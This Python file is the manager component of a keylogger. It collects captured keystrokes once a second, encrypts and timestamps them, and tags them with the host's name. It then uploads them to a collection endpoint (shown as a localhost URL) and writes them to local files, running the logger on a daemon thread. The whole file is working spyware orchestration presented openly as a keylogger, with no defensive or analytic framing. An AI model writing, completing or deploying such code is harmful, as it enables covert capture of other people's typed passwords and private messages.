import socket
from datetime import datetime
import time
import threading
from KeyService import KeyLoggerService
from FileWriter import FileWriter
from Encryptor import Encryptor
from NetworkWriter import NetworkWriter


class KeyLoggerManager:
    def __init__(self, secret_key):
        self.service = KeyLoggerService()
        self.file_writer = FileWriter()
        self.encryptor = Encryptor(secret_key)
        self.network_writer = NetworkWriter()
        self.data_dic = {}
        self.entries_list = []  # List to store formatted log entries
        self.num_of_enter = 0
        self.computer_id = socket.gethostname()
        self.datestamp = ""

    def run(self):
        self.service.start_logging()
        while self.service.running:
            time.sleep(1)
            self.add_to_dic()
            self.num_of_enter += 1
            if self.num_of_enter == 3:
                threading.Thread(target=self.save_locally, daemon=True).start()
                self.num_of_enter = 0

    def stop(self):
        self.service.stop_logging()
        print("KeyLogger stopped.")

    def add_to_dic(self):
        logged_keys = "".join(self.service.get_logged_keys())
        if logged_keys == "":
            return

        encrypted_data = self.encryptor.encrypt(logged_keys)
        timestamp = datetime.now().strftime("%H:%M:%S")
        datestamp = datetime.now().strftime("%Y-%m-%d")

        if encrypted_data:
            log_entry = {
                "timestamp": timestamp,
                "datestamp": datestamp,
                "key_data": encrypted_data
            }
            self.entries_list.append(log_entry)
            print(f"Added {len(logged_keys)} keys to the list.")

        self.service.clear_data()

    def save_locally(self):
        try:
            if not self.entries_list:
                print("No new data to save.")
                return

            print(f"Data to send: {self.entries_list}")

            # Send data to the server
            self.send_to_server()

            # Save data locally
            self.file_writer.send_data(self.entries_list, self.computer_id)
            print("Data saved locally.")

            self.entries_list = []  # Clear the list after saving
        except Exception as e:
            print(f"Failed to save data locally: {e}")

    def send_to_server(self):
        if not self.entries_list:
            print("No new data to send to the server.")
            return

        payload = {
            "computer_id": self.computer_id,
            "logs": self.entries_list  # Use the persistent list directly
        }
        self.network_writer.send_data(payload, "http://127.0.0.1:5000/upload")


if __name__ == "__main__":
    secret_key = "your_secure_secret_key"
    keyManager = KeyLoggerManager(secret_key)

    keylogger_thread = threading.Thread(target=keyManager.run, daemon=True)
    keylogger_thread.start()

    try:
        while True:
            time.sleep(1)  # Keeps the program running
    except KeyboardInterrupt:
        keyManager.stop()
        keylogger_thread.join()